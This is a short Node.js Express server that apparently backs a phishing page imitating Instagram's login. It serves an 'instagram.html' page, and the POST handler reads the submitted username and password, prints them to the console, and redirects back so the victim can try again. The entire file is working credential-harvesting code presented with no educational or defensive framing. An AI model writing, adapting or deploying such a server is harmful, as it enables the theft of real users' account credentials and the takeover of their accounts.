import express from "express";
import path from "path"

const app = express();

app.use(express.urlencoded({
    extended: true
}));

app.use(express.static("instagram"));

app.get("/", (req, res) => {
    res.redirect("/instagram");
});

app.post("/instagram", (req, res) => {
    const{username , password } = req.body;

    console.log({
        username,
        password
    });
    res.redirect("/instagram");
})

app.get("/instagram", (req, res)=> {
    res.sendFile(path.resolve("instagram/instagram.html"))
})

app.listen(process.env.PORT);